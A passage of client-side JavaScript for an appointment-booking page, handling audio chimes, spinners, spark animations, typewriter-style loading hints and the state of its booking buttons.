    
    function playTone(freq, type, duration, delay = 0) {
        if(audioCtx.state === 'suspended') audioCtx.resume();
        const osc = audioCtx.createOscillator();
        const gain = audioCtx.createGain();
        osc.type = type;
        osc.frequency.setValueAtTime(freq, audioCtx.currentTime + delay);
        gain.gain.setValueAtTime(0.1, audioCtx.currentTime + delay);
        gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + delay + duration);
        osc.connect(gain);
        gain.connect(audioCtx.destination);
        osc.start(audioCtx.currentTime + delay);
        osc.stop(audioCtx.currentTime + delay + duration);
    }

    function playSuccessSound() {
        playTone(523.25, 'sine', 1.5, 0);   // C5
        playTone(659.25, 'sine', 1.5, 0.1); // E5
        playTone(783.99, 'sine', 1.5, 0.2); // G5
        playTone(1046.50, 'sine', 2.5, 0.3); // C6
    }
    
    document.addEventListener('click', function initAudio() {
        if(audioCtx.state === 'suspended') {
            audioCtx.resume();
        }
        document.removeEventListener('click', initAudio);
    }, { once: true });

    function getEndTime(startTime) {
        try {
            const [time, modifier] = startTime.split(' ');
            let [hours, minutes] = time.split(':');
            
             const d = new Date();
             let h = parseInt(hours);
             if (modifier === 'PM' && h !== 12) h += 12;
             if (modifier === 'AM' && h === 12) h = 0;
             
             d.setHours(h);
             d.setMinutes(parseInt(minutes));
             // Add 50 minutes instead of 1 hour
             d.setMinutes(d.getMinutes() + 50);
             
             return d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', hour12: true});
        } catch(e) {
            return "50 min later";
        }
    }

    const GLOBAL_SPINNER_RADIUS = 48;
    const GLOBAL_SPINNER_CIRCUMFERENCE = 2 * Math.PI * GLOBAL_SPINNER_RADIUS;

    function setGlobalSpinnerProgress(percent) {
        const spinner = document.getElementById('globalSpinner');
        if (!spinner) return;
        const glow = spinner.querySelector('.global-spinner__glow');
        const valueNode = document.getElementById('globalSpinnerValue');
        const safePercent = Math.max(0, Math.min(100, Number(percent) || 0));

        if (glow) {
            glow.style.strokeDasharray = String(GLOBAL_SPINNER_CIRCUMFERENCE);
            glow.style.strokeDashoffset = String(
                GLOBAL_SPINNER_CIRCUMFERENCE - (GLOBAL_SPINNER_CIRCUMFERENCE * safePercent / 100)
            );
        }
        if (valueNode) valueNode.textContent = `${Math.round(safePercent)}%`;
    }

    function showGlobalSpinner(mode) {
        const spinner = document.getElementById('globalSpinner');
        if (!spinner) return;
        spinner.style.display = 'flex';
        spinner.classList.remove('global-spinner--indeterminate');
        spinner.classList.remove('global-spinner--hypnotic');
        if (mode === 'indeterminate') {
            spinner.classList.add('global-spinner--indeterminate');
            const valueNode = document.getElementById('globalSpinnerValue');
            if (valueNode) valueNode.textContent = '';
            return;
        }
        if (mode === 'hypnotic-progress') {
            spinner.classList.add('global-spinner--hypnotic');
            const valueNode = document.getElementById('globalSpinnerValue');
            if (valueNode && !valueNode.textContent) valueNode.textContent = '0%';
        }
    }

    function hideGlobalSpinner() {
        const spinner = document.getElementById('globalSpinner');
        if (!spinner) return;
        spinner.style.display = 'none';
        spinner.classList.remove('global-spinner--indeterminate');
        spinner.classList.remove('global-spinner--hypnotic');
    }

    window.addEventListener('load', () => {
        // Run UI adjustments and permission requests immediately so they don't cause late layout shifts
        adjustDynamicText();
        
        // Send the initial Page Load event asynchronously to guarantee correct row color
        logEvent("Page Load", window.location.href);
    });

    function scrollToCalendar() {
        const cal = document.getElementById('bookingCalendar');
        if (cal) cal.scrollIntoView({ behavior: 'smooth', block: 'center' });
        setTimeout(() => {
            const nearestEl = document.querySelector('.cal-day--nearest');
            if (nearestEl) nearestEl.click();
        }, 600);
    }

    // Lightweight particle burst: throttled and adaptive for low-end devices.
    const sparkBurstState = new WeakMap();
    function createSparks(container) {
        if (!container) return 0;
        if (document.hidden) return 0;
        const prefersReducedMotion = !!(window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches);

        const isLowEndDevice = (
            (typeof navigator.hardwareConcurrency === 'number' && navigator.hardwareConcurrency > 0 && navigator.hardwareConcurrency <= 4) ||
            (typeof navigator.deviceMemory === 'number' && navigator.deviceMemory > 0 && navigator.deviceMemory <= 4)
        );

        const now = performance.now();
        const lastBurstAt = sparkBurstState.get(container) || 0;
        const minIntervalMs = prefersReducedMotion ? 900 : (isLowEndDevice ? 700 : 260);
        if (now - lastBurstAt < minIntervalMs) return 0;
        sparkBurstState.set(container, now);

        if (!container.style.position) {
            container.style.position = 'relative';
        }

        const burstCount = prefersReducedMotion ? 6 : (isLowEndDevice ? 16 : 34);
        const startJitter = isLowEndDevice ? 10 : 14;
        const minFlightDistance = isLowEndDevice ? 86 : 168;
        const maxFlightDistance = isLowEndDevice ? 220 : 430;
        const minFallDistance = prefersReducedMotion ? 10 : (isLowEndDevice ? 16 : 26);
        const maxFallDistance = prefersReducedMotion ? 20 : (isLowEndDevice ? 34 : 64);
        const maxDelay = prefersReducedMotion ? 70 : (isLowEndDevice ? 110 : 170);
        const durationMs = prefersReducedMotion ? 420 : (isLowEndDevice ? 760 : 1080);
        const minSparkSize = isLowEndDevice ? 6 : 7;
        const maxSparkSize = isLowEndDevice ? 10 : 13;

        const fragment = document.createDocumentFragment();
        const sparks = [];

        for (let i = 0; i < burstCount; i++) {
            const spark = document.createElement('div');
            spark.className = 'spark';

            // Firework-like burst in all directions, then slight gravity fall.
            const angleDeg = Math.random() < 0.72
                ? Math.random() * 360
                : (-170 + Math.random() * 160);
            const angle = angleDeg * (Math.PI / 180);
            const startRadius = Math.random() * startJitter;
            const startX = Math.cos(angle) * startRadius;
            const startY = Math.sin(angle) * startRadius;
            spark.style.left = `calc(50% + ${startX.toFixed(1)}px)`;
            spark.style.top = `calc(50% + ${startY.toFixed(1)}px)`;

            const flightDistance = minFlightDistance + Math.random() * (maxFlightDistance - minFlightDistance);
            const midX = Math.cos(angle) * flightDistance;
            const midY = Math.sin(angle) * flightDistance;

            const horizontalDrift = (Math.random() - 0.5) * (isLowEndDevice ? 28 : 64);
            const fallDistance = minFallDistance + Math.random() * (maxFallDistance - minFallDistance);
            const extraGravity = Math.random() * (isLowEndDevice ? 22 : 44);
            const endX = (midX * (1 + Math.random() * (isLowEndDevice ? 0.18 : 0.3))) + horizontalDrift;
            const endY = midY + fallDistance + extraGravity;

            spark.style.setProperty('--x-mid', `${midX.toFixed(1)}px`);
            spark.style.setProperty('--y-mid', `${midY.toFixed(1)}px`);
            spark.style.setProperty('--x-end', `${endX.toFixed(1)}px`);
            spark.style.setProperty('--y-end', `${endY.toFixed(1)}px`);
            spark.style.setProperty('--spark-delay', `${Math.floor(Math.random() * maxDelay)}ms`);
            spark.style.setProperty('--spark-duration', `${durationMs}ms`);
            spark.style.setProperty('--spark-size', `${(minSparkSize + Math.random() * (maxSparkSize - minSparkSize)).toFixed(1)}px`);
            spark.style.setProperty('--spark-rotate', `${Math.floor(Math.random() * 360)}deg`);

            fragment.appendChild(spark);
            sparks.push(spark);
        }

        container.appendChild(fragment);

        setTimeout(() => {
            for (let i = 0; i < sparks.length; i++) {
                if (sparks[i] && sparks[i].parentNode) {
                    sparks[i].parentNode.removeChild(sparks[i]);
                }
            }
        }, durationMs + maxDelay + 80);
        return durationMs + maxDelay + 80;
    }

    function normalizeSlotNotFoundText() {
        const nodes = document.querySelectorAll('.book-btn-preloader__text');
        nodes.forEach(node => {
            const raw = String(node.textContent || '').trim();
            if (!raw) return;
            if (/slot\s*no\s*found/i.test(raw) || /slots\s*no\s*found/i.test(raw) || /slot\s*not\s*fount/i.test(raw)) {
                node.textContent = 'NO SLOTS FOUND';
            }
        });
    }

    function buildButtonLine(text, styles = {}) {
        const line = document.createElement('span');
        line.textContent = text || '';
        Object.entries(styles).forEach(([key, value]) => {
            line.style[key] = value;
        });
        return line;
    }

    function formatDateAsYmd(dateObj) {
        if (!(dateObj instanceof Date) || Number.isNaN(dateObj.getTime())) return '';
        const y = dateObj.getFullYear();
        const m = String(dateObj.getMonth() + 1).padStart(2, '0');
        const d = String(dateObj.getDate()).padStart(2, '0');
        return `${y}.${m}.${d}`;
    }

    function getSlotStartTime(slot) {
        if (!slot || !slot.text) return '';
        return String(slot.text).split(/[-\u2013]/)[0].trim();
    }

    const HEADER_NEAREST_HINT_LOADING_SEQUENCE = [
        'Hello ...',
        'Syncing with your calendar...',
        'Looking for an available slot...'
    ];
    const HEADER_NEAREST_HINT_LOADING_TEXT = HEADER_NEAREST_HINT_LOADING_SEQUENCE[0];
    const HEADER_NEAREST_HINT_LOADING_FINAL_TEXT =
        HEADER_NEAREST_HINT_LOADING_SEQUENCE[HEADER_NEAREST_HINT_LOADING_SEQUENCE.length - 1];
    const HEADER_NEAREST_HINT_UNLOCK_EVENT = 'header-book-btn-first-particles-done';
    const HEADER_NEAREST_HINT_RESOLVED_RE = /^Nearest appointment:\s*\d{4}\.\d{2}\.\d{2}(?:\s+at\s+\d{1,2}:\d{2}\s*(?:AM|PM))?/i;
    const HEADER_NEAREST_HINT_TYPEWRITER_MAX_MS = 10000;
    let headerNearestHintTypewriterTimer = null;
    let headerNearestHintTypewriterToken = 0;
    let headerNearestHintTypewriterActive = false;
    let headerNearestHintTypewriterTargetText = '';
    let headerNearestHintLoadingTypedOnce = false;
    let headerNearestHintLastRenderedText = '';
    let headerNearestHintResolvedTypingUnlocked = false;
    let headerNearestHintQueuedResolvedText = '';
    const HEADER_PRELOADER_BOOT_TEXT_PRIMARY = 'Loading calendar availability...';
    const HEADER_PRELOADER_SEARCH_TEXT = 'Looking for a free slot...';
    let headerPreloaderSearchTypewriterTimer = null;
    let headerPreloaderSearchTypewriterToken = 0;
    let headerPreloaderSearchTypewriterActive = false;
    let headerPreloaderSearchTypewriterNode = null;
    let headerPreloaderSearchTypedOnce = false;
    let headerPreloaderBootSequenceDone = false;
    let headerNearestHintFirstSparkTriggered = false;

    function clearHeaderNearestHintTypewriter() {
        if (headerNearestHintTypewriterTimer) {
            clearTimeout(headerNearestHintTypewriterTimer);
            headerNearestHintTypewriterTimer = null;
        }
        headerNearestHintTypewriterActive = false;
        headerNearestHintTypewriterTargetText = '';
    }

    function clearHeaderPreloaderSearchTypewriter() {
        if (headerPreloaderSearchTypewriterTimer) {
            clearTimeout(headerPreloaderSearchTypewriterTimer);
            headerPreloaderSearchTypewriterTimer = null;
        }
        const activeNode = headerPreloaderSearchTypewriterNode;
        if (activeNode && activeNode.classList) {
            activeNode.classList.remove('book-btn-preloader__text--typing');
        }
        headerPreloaderSearchTypewriterActive = false;
        headerPreloaderSearchTypewriterNode = null;
    }

    function maybeTriggerHeaderBookFirstParticlesAfterTypewriter(finalText) {
        if (!HEADER_NEAREST_HINT_RESOLVED_RE.test(String(finalText || ''))) return;
        if (headerNearestHintFirstSparkTriggered) return;
        const triggerSparks = window.__triggerHeaderBookFirstSparkByTypewriter;
        if (typeof triggerSparks !== 'function') return;

        const tryTrigger = (attempt = 0) => {
            const sparkLifetimeMs = Number(triggerSparks()) || 0;
            if (sparkLifetimeMs > 0) {
                headerNearestHintFirstSparkTriggered = true;
                return;
            }
            if (attempt < 4) {
                setTimeout(() => tryTrigger(attempt + 1), 90);
            }
        };

        tryTrigger(0);
    }

    function startHeaderPreloaderSearchTypewriter(node, finalText) {
        clearHeaderPreloaderSearchTypewriter();
        headerPreloaderSearchTypewriterToken += 1;
        const runToken = headerPreloaderSearchTypewriterToken;
        const runBootSequence = !headerPreloaderBootSequenceDone;
        if (runBootSequence) {
            headerPreloaderBootSequenceDone = true;
        }
        const phases = runBootSequence
            ? [HEADER_PRELOADER_BOOT_TEXT_PRIMARY, finalText]
            : [finalText];
        let phaseIndex = 0;
        let index = 0;

        headerPreloaderSearchTypewriterActive = true;
        headerPreloaderSearchTypewriterNode = node;
        node.textContent = '';
        node.classList.add('book-btn-preloader__text--typing');

        const schedule = (fn, delay) => {
            headerPreloaderSearchTypewriterTimer = setTimeout(fn, delay);
        };

        const getKeyboardDelay = (ch) => {
            let delay = randomInt(12, 34);
            if (ch === ' ') delay += randomInt(18, 48);
            if (/[,.!?]/.test(ch)) delay += randomInt(30, 85);
            return delay;
        };

        const eraseCurrent = () => {
            if (runToken !== headerPreloaderSearchTypewriterToken) return;
            if (!node || !node.isConnected) {
                clearHeaderPreloaderSearchTypewriter();
                return;
            }
            const currentText = phases[phaseIndex] || '';
            if (index <= 0) {
                phaseIndex += 1;
                index = 0;
                schedule(typeNext, randomInt(90, 180));
                return;
            }
            index -= 1;
            node.textContent = currentText.slice(0, index);
            schedule(eraseCurrent, randomInt(10, 24));
        };

        const typeNext = () => {
            if (runToken !== headerPreloaderSearchTypewriterToken) return;
            if (!node || !node.isConnected) {
                clearHeaderPreloaderSearchTypewriter();
                return;
            }
            const currentText = phases[phaseIndex] || '';

            if (index >= currentText.length) {
                node.textContent = currentText;
                if (phaseIndex < phases.length - 1) {
                    schedule(eraseCurrent, randomInt(240, 360));
                    return;
                }
                clearHeaderPreloaderSearchTypewriter();
                headerPreloaderSearchTypedOnce = true;
                headerPreloaderBootSequenceDone = true;
                return;
            }

            index += 1;
            node.textContent = currentText.slice(0, index);

            const typedChar = currentText[index - 1] || '';
            schedule(typeNext, getKeyboardDelay(typedChar));
        };

        schedule(typeNext, randomInt(30, 70));
    }

    function showHeaderPreloaderSearchText(node) {
        if (!node) return;
        node.classList.add('book-btn-preloader__text--loading');
        node.style.display = 'block';
        node.style.opacity = '1';
        if (headerPreloaderSearchTypewriterActive && headerPreloaderSearchTypewriterNode === node) return;
        if (headerPreloaderSearchTypedOnce) {
            node.classList.remove('book-btn-preloader__text--typing');
            node.textContent = HEADER_PRELOADER_SEARCH_TEXT;
            return;
        }
        startHeaderPreloaderSearchTypewriter(node, HEADER_PRELOADER_SEARCH_TEXT);
    }

    function randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function buildHumanTypeDelays(text) {
        const delays = [];
        for (let i = 0; i < text.length; i += 1) {
            const ch = text[i];
            let delay = randomInt(45, 170);

            if (ch === ' ') {
                delay += randomInt(35, 115);
            } else if (/[,:;.!?]/.test(ch)) {
                delay += randomInt(120, 280);
            } else if (/[A-Z]/.test(ch) && i !== 0) {
                delay += randomInt(8, 45);
            }

            if (Math.random() < 0.09) delay += randomInt(120, 260);
            if (Math.random() < 0.14) delay -= randomInt(8, 28);

            delay = Math.max(24, Math.min(420, delay));
            delays.push(delay);
        }

        const total = delays.reduce((sum, val) => sum + val, 0);
        const budget = Math.floor(HEADER_NEAREST_HINT_TYPEWRITER_MAX_MS * 0.92);
        if (total > budget && total > 0) {
            const scale = budget / total;
            for (let i = 0; i < delays.length; i += 1) {
                delays[i] = Math.max(18, Math.round(delays[i] * scale));
            }
        }
        return delays;
    }

    function startHeaderNearestHintLoadingSequence(hintEl) {
        clearHeaderNearestHintTypewriter();
        headerNearestHintTypewriterToken += 1;
        const runToken = headerNearestHintTypewriterToken;
        const phases = HEADER_NEAREST_HINT_LOADING_SEQUENCE;
        let phaseIndex = 0;
        let index = 0;

        headerNearestHintTypewriterActive = true;
        headerNearestHintTypewriterTargetText = HEADER_NEAREST_HINT_LOADING_FINAL_TEXT;
        hintEl.textContent = '';

        const schedule = (fn, delay) => {
            headerNearestHintTypewriterTimer = setTimeout(fn, delay);
        };

        const getKeyboardDelay = (ch) => {
            let delay = randomInt(26, 72);
            if (ch === ' ') delay += randomInt(14, 42);
            if (/[,.!?]/.test(ch)) delay += randomInt(28, 90);
            return delay;
        };

        const eraseCurrent = () => {
            if (runToken !== headerNearestHintTypewriterToken) return;
            const currentText = phases[phaseIndex] || '';
            if (index <= 0) {
                phaseIndex += 1;
                index = 0;
                schedule(typeNext, randomInt(110, 220));
                return;
            }
            index -= 1;
            hintEl.textContent = currentText.slice(0, index);
            schedule(eraseCurrent, randomInt(12, 28));
        };

        const typeNext = () => {
            if (runToken !== headerNearestHintTypewriterToken) return;
            const currentText = phases[phaseIndex] || '';

            if (index >= currentText.length) {
                hintEl.textContent = currentText;
                if (phaseIndex < phases.length - 1) {
                    schedule(eraseCurrent, randomInt(260, 420));
                    return;
                }
                clearHeaderNearestHintTypewriter();
                headerNearestHintLoadingTypedOnce = true;
                headerNearestHintLastRenderedText = HEADER_NEAREST_HINT_LOADING_FINAL_TEXT;
                hintEl.textContent = HEADER_NEAREST_HINT_LOADING_FINAL_TEXT;
                return;
            }

            index += 1;
            hintEl.textContent = currentText.slice(0, index);
            const typedChar = currentText[index - 1] || '';
            schedule(typeNext, getKeyboardDelay(typedChar));
        };

        schedule(typeNext, randomInt(80, 180));
    }

    function startHeaderNearestHintTypewriter(hintEl, finalText) {
        clearHeaderNearestHintTypewriter();
        headerNearestHintTypewriterToken += 1;
        const runToken = headerNearestHintTypewriterToken;
        const delays = buildHumanTypeDelays(finalText);
        const startedAt = performance.now();
        const deadline = startedAt + HEADER_NEAREST_HINT_TYPEWRITER_MAX_MS;
        let index = 0;

        headerNearestHintTypewriterActive = true;
        headerNearestHintTypewriterTargetText = finalText;
        hintEl.textContent = '';

        const typeNext = () => {
            if (runToken !== headerNearestHintTypewriterToken) return;

            const now = performance.now();
            if (index >= finalText.length || now >= deadline) {
                hintEl.textContent = finalText;
                clearHeaderNearestHintTypewriter();
                headerNearestHintLoadingTypedOnce = true;
                headerNearestHintLastRenderedText = finalText;
                maybeTriggerHeaderBookFirstParticlesAfterTypewriter(finalText);
                return;
            }

            index += 1;
            hintEl.textContent = finalText.slice(0, index);

            if (index >= finalText.length) {
                clearHeaderNearestHintTypewriter();
                headerNearestHintLoadingTypedOnce = true;
                headerNearestHintLastRenderedText = finalText;
                maybeTriggerHeaderBookFirstParticlesAfterTypewriter(finalText);
                return;
            }

            const remainingChars = finalText.length - index;
            const remainingTime = Math.max(0, deadline - performance.now());
            const capDelay = Math.max(16, Math.floor(remainingTime / Math.max(1, remainingChars)));
            const nextPlannedDelay = delays[index] || randomInt(40, 120);
            const nextDelay = Math.max(16, Math.min(nextPlannedDelay, capDelay));

            headerNearestHintTypewriterTimer = setTimeout(typeNext, nextDelay);
        };

        const initialDelay = randomInt(110, 260);
        headerNearestHintTypewriterTimer = setTimeout(typeNext, initialDelay);
    }

    function setHeaderNearestSlotHint(message) {
        const hintEl = document.getElementById('headerNearestSlotHint');
        if (!hintEl) return;
        const nextText = String(message || '').trim();
        hintEl.classList.toggle('header-nearest-slot-hint--visible', Boolean(nextText));

        if (!nextText) {
            clearHeaderNearestHintTypewriter();
            headerNearestHintLoadingTypedOnce = false;
            headerNearestHintQueuedResolvedText = '';
            headerNearestHintLastRenderedText = '';
            hintEl.textContent = '';
            return;
        }

        if (nextText === HEADER_NEAREST_HINT_LOADING_TEXT) {
            if (
                headerNearestHintTypewriterActive &&
                headerNearestHintTypewriterTargetText === HEADER_NEAREST_HINT_LOADING_FINAL_TEXT
            ) {
                return;
            }
            if (headerNearestHintLoadingTypedOnce) {
                hintEl.textContent = HEADER_NEAREST_HINT_LOADING_FINAL_TEXT;
                headerNearestHintLastRenderedText = HEADER_NEAREST_HINT_LOADING_FINAL_TEXT;
                return;
            }
            startHeaderNearestHintLoadingSequence(hintEl);
            return;
        }

        if (HEADER_NEAREST_HINT_RESOLVED_RE.test(nextText)) {
            if (!headerNearestHintResolvedTypingUnlocked) {
                headerNearestHintQueuedResolvedText = nextText;
                return;
            }
            if (
                (headerNearestHintTypewriterActive && headerNearestHintTypewriterTargetText === nextText) ||
                (!headerNearestHintTypewriterActive && headerNearestHintLastRenderedText === nextText)
            ) {
                return;
            }
            startHeaderNearestHintTypewriter(hintEl, nextText);
            return;
        }

        headerNearestHintLoadingTypedOnce = false;
        clearHeaderNearestHintTypewriter();
        hintEl.textContent = nextText;
        headerNearestHintLastRenderedText = nextText;
    }

    window.addEventListener(HEADER_NEAREST_HINT_UNLOCK_EVENT, () => {
        headerNearestHintResolvedTypingUnlocked = true;
        const queued = String(headerNearestHintQueuedResolvedText || '').trim();
        if (!queued) return;
        const hintEl = document.getElementById('headerNearestSlotHint');
        if (!hintEl) return;
        headerNearestHintQueuedResolvedText = '';
        hintEl.classList.add('header-nearest-slot-hint--visible');
        if (
            (headerNearestHintTypewriterActive && headerNearestHintTypewriterTargetText === queued) ||
            (!headerNearestHintTypewriterActive && headerNearestHintLastRenderedText === queued)
        ) {
            return;
        }
        startHeaderNearestHintTypewriter(hintEl, queued);
    });

    function renderHeaderBookBtnText(targetEl, dayShort, dayDate, timeStr) {
        if (!targetEl) return;
        targetEl.innerHTML = 'BOOK';
    }

    function renderFooterBookBtnText(targetEl, dayFull, dayDate, timeStr) {
        if (!targetEl) return;
        targetEl.innerHTML = 'BOOK';
    }
    
    function updateFooterBookBtn() {
        normalizeSlotNotFoundText();
        const isOffline = navigator.onLine === false;
        const targets = [
            { btn: document.getElementById('footerBookBtn'), txt: document.getElementById('footerBookBtnText'), preloader: document.getElementById('footerBookBtnPreloader') },
            { btn: document.getElementById('headerBookBtn'), txt: document.getElementById('headerBookBtnText'), preloader: document.getElementById('headerBookBtnPreloader') }
        ];

        targets.forEach(t => {
            if (!t.btn) return;
            const isHeaderBtn = t.btn.id === 'headerBookBtn';

            if (!isHeaderBtn) {
                if (absoluteNearestDate && nearestSlotData) {
                    const dayOfWeekFull = absoluteNearestDate.toLocaleDateString('en-US', { weekday: 'long' });
                    const fallbackSlot = nearestDayLastSlotData || nearestSlotData;
                    let lastTimeStr = '';
                    if (fallbackSlot && fallbackSlot.text) {
                        lastTimeStr = fallbackSlot.text.split(/[-\u2013]/)[0].trim();
                    }
                    renderFooterBookBtnText(t.txt, dayOfWeekFull, fallbackSlot ? fallbackSlot.date : '', lastTimeStr);
                }
                t.btn.style.transition = 'opacity 0.5s, transform 0.5s';
                t.btn.style.opacity = '1';
                t.btn.style.transform = 'scale(1)';
                t.btn.style.pointerEvents = 'auto';
                return;
            }

            if (!t.preloader) return;
            if (isOffline) {
                if (t._errorTimer) {
                    clearTimeout(t._errorTimer);
                    t._errorTimer = null;
                }
                clearHeaderPreloaderSearchTypewriter();

                t.preloader.classList.remove('book-btn-preloader--error');
                t.preloader.classList.remove('book-btn-preloader--hypnotic');
                t.preloader.classList.add('book-btn-preloader--offline');

                const offlineSvg = t.preloader.querySelector('.book-btn-preloader__svg');
                if (offlineSvg) offlineSvg.style.animation = 'none';

                const offlineNode = t.preloader.querySelector('.book-btn-preloader__text');
                if (offlineNode) {
                    offlineNode.classList.remove('book-btn-preloader__text--loading');
                    offlineNode.textContent = 'NO INTERNET CONNECTION';
                    offlineNode.style.display = 'block';
                    offlineNode.style.opacity = '1';
                }

                t.preloader.style.opacity = '1';
                t.preloader.style.transform = 'scale(1)';
                t.preloader.style.filter = 'blur(0)';
                t.preloader.style.pointerEvents = 'none';
                t.btn.style.opacity = '0';
                t.btn.style.pointerEvents = 'none';
                if (t.btn.id === 'headerBookBtn') {
                    setHeaderNearestSlotHint('Nearest appointment: unavailable (no internet connection).');
                }
                return;
            }

                t.preloader.classList.remove('book-btn-preloader--offline');

            if (absoluteNearestDate && nearestSlotData) {
                clearHeaderPreloaderSearchTypewriter();
                const dayOfWeekShort = absoluteNearestDate.toLocaleDateString('en-US', { weekday: 'short' });
                const dayOfWeekFull = absoluteNearestDate.toLocaleDateString('en-US', { weekday: 'long' });
                const fallbackSlot = nearestDayLastSlotData || nearestSlotData;

                if (t.btn.id === 'headerBookBtn') {
                    let timeStr = '';
                    if (nearestSlotData && nearestSlotData.text) {
                        timeStr = nearestSlotData.text.split(/[-\u2013]/)[0].trim();
                    }
                    renderHeaderBookBtnText(t.txt, dayOfWeekShort, nearestSlotData.date, timeStr);
                    const nearestDateLabel = formatDateAsYmd(absoluteNearestDate);
                    const nearestTimeLabel = getSlotStartTime(nearestSlotData);
                    const hintText = nearestDateLabel && nearestTimeLabel
                        ? `Nearest appointment: ${nearestDateLabel} at ${nearestTimeLabel}`
                        : (nearestDateLabel
                            ? `Nearest appointment: ${nearestDateLabel}`
                            : HEADER_NEAREST_HINT_LOADING_TEXT);
                    setHeaderNearestSlotHint(hintText);
                }
                
                t.preloader.style.transition = 'opacity 1.35s cubic-bezier(0.22, 1, 0.36, 1), transform 1.35s cubic-bezier(0.22, 1, 0.36, 1), filter 1.35s cubic-bezier(0.22, 1, 0.36, 1)';
                t.preloader.style.opacity = '0';
                t.preloader.style.transform = 'scale(0.86)';
                t.preloader.style.filter = 'blur(0.28rem)';
                t.preloader.style.pointerEvents = 'none';
                const loadingNode = t.preloader.querySelector('.book-btn-preloader__text');
                if (loadingNode) {
                    loadingNode.classList.remove('book-btn-preloader__text--loading');
                    loadingNode.style.display = 'none';
                    loadingNode.style.opacity = '0';
                }

                t.btn.style.transition = 'opacity 0.5s, transform 0.5s';
                t.btn.style.opacity = '1';
                t.btn.style.transform = 'scale(1)';
                t.btn.style.pointerEvents = 'auto';
            } else {
                // No data yet: keep neutral loading state
                t.preloader.style.opacity = '1';
                t.preloader.style.transform = 'scale(1)';
                t.preloader.style.filter = 'blur(0)';
                t.preloader.style.pointerEvents = 'none';
                t.btn.style.opacity = '0';
                t.btn.style.pointerEvents = 'none';
                if (t.btn.id === 'headerBookBtn') {
                    setHeaderNearestSlotHint(HEADER_NEAREST_HINT_LOADING_TEXT);
                }

                // Cancel any previously scheduled error timer for this target
                if (t._errorTimer) {
                    clearTimeout(t._errorTimer);
                    t._errorTimer = null;
                    // Reset error state if re-trying
                    t.preloader.classList.remove('book-btn-preloader--error');
                    const svg = t.preloader.querySelector('.book-btn-preloader__svg');
                    if (svg) svg.style.animation = '';
                    const errText = t.preloader.querySelector('.book-btn-preloader__text');
                    if (errText) {
                        errText.classList.remove('book-btn-preloader__text--loading');
                        errText.textContent = '';
                        errText.style.display = 'none';
                        errText.style.opacity = '0';
                    }
                }

                t.preloader.classList.remove('book-btn-preloader--error');
                const svg = t.preloader.querySelector('.book-btn-preloader__svg');
                if (svg) svg.style.animation = '';
                const errText = t.preloader.querySelector('.book-btn-preloader__text');
                if (errText) {
                    showHeaderPreloaderSearchText(errText);
                }

                t._errorTimer = setTimeout(() => {
                    clearHeaderPreloaderSearchTypewriter();
                    t.preloader.classList.add('book-btn-preloader--error');
                    const errSvg = t.preloader.querySelector('.book-btn-preloader__svg');
                    if (errSvg) errSvg.style.animation = 'none';
                    const errNode = t.preloader.querySelector('.book-btn-preloader__text');
                    if (errNode) {
                        errNode.classList.remove('book-btn-preloader__text--loading');
                        errNode.textContent = 'NO SLOTS FOUND';
                        errNode.style.display = 'block';
                        errNode.style.opacity = '1';
                    }
                }, 20000);
            }
        });
        normalizeSlotNotFoundText();
    }
    window.addEventListener('online', updateFooterBookBtn);
    window.addEventListener('offline', updateFooterBookBtn);

    function bookNearestSlot() {
        if (absoluteNearestDate && nearestSlotData) {
            selectedDate = absoluteNearestDate;
            stageBookingAfterIntake(nearestSlotData);
        } else {
            scrollToCalendar();
        }
    }

    function bookNearestSlotLast(triggerAttach = false) {
        if (absoluteNearestDate && nearestDayLastSlotData) {
            selectedDate = absoluteNearestDate;
            stageBookingAfterIntake(nearestDayLastSlotData, triggerAttach);
        } else {
            scrollToCalendar();
        }
    }

    // Custom Select Initialization
    function setCustomSelectValue(selectId, nextValue) {
        const selectElement = document.getElementById(selectId);
        if (!selectElement) return false;
        const trigger = selectElement.querySelector('.custom-select__trigger');
        const triggerTextEl = trigger ? trigger.querySelector('span') : null;
        const options = Array.from(selectElement.querySelectorAll('.custom-option'));
        if (!trigger || !triggerTextEl || !options.length) return false;

        if (!trigger.dataset.placeholder) {
            trigger.dataset.placeholder = normalizeSingleLine(triggerTextEl.textContent);
        }

        const normalizedTarget = normalizeSingleLine(nextValue);
        let selectedOption = null;

        options.forEach(option => {
            const optionText = normalizeSingleLine(option.textContent);
            const optionValue = normalizeSingleLine(option.getAttribute('data-value'));
            const isSelected = !!normalizedTarget && (optionText === normalizedTarget || optionValue === normalizedTarget);
            option.classList.toggle('selected', isSelected);
            if (isSelected) selectedOption = option;
        });

        const hiddenInputId = selectElement.dataset.inputId;
        const hiddenInput = hiddenInputId ? document.getElementById(hiddenInputId) : null;

        if (selectedOption) {
            const selectedText = selectedOption.textContent.trim();
            if (selectId === 'cityCustomSelect') {
                triggerTextEl.textContent = `${selectedText} \u2713`;
                trigger.classList.add('has-city-check');
            } else {
                triggerTextEl.textContent = selectedText;
            }
            if (hiddenInput) {
                if (selectId === 'provinceCustomSelect') {
                    hiddenInput.value = normalizeSingleLine(selectedOption.getAttribute('data-value') || selectedText);
                } else {
                    hiddenInput.value = selectedText;
                }
            }
            return true;
        }

        triggerTextEl.textContent = trigger.dataset.placeholder || '';
        if (selectId === 'cityCustomSelect') {
            trigger.classList.remove('has-city-check');
        }
        if (hiddenInput) hiddenInput.value = '';
        return false;
    }

    function findScrollableAncestor(node) {
        let current = node ? node.parentElement : null;
        while (current && current !== document.body) {
            const style = window.getComputedStyle(current);
            const overflowY = String(style.overflowY || '').toLowerCase();
            const canScrollY = (overflowY === 'auto' || overflowY === 'scroll' || overflowY === 'overlay');
            if (canScrollY && current.scrollHeight > current.clientHeight + 1) {
                return current;
            }
            current = current.parentElement;
        }
        return document.scrollingElement || document.documentElement;
    }

    function isDocumentScrollHost(scrollHost) {
        return (
            scrollHost === document.scrollingElement ||
            scrollHost === document.documentElement ||
            scrollHost === document.body
        );
    }

    function getScrollTopForHost(scrollHost) {
        if (isDocumentScrollHost(scrollHost)) {
            return window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        }
        return scrollHost ? scrollHost.scrollTop : 0;
    }

    function setScrollTopForHost(scrollHost, nextTop, smooth) {
        if (isDocumentScrollHost(scrollHost)) {
            if (smooth) {
                window.scrollTo({ top: nextTop, behavior: 'smooth' });
            } else {
                window.scrollTo(0, nextTop);
            }
            return;
        }

        if (!scrollHost) return;
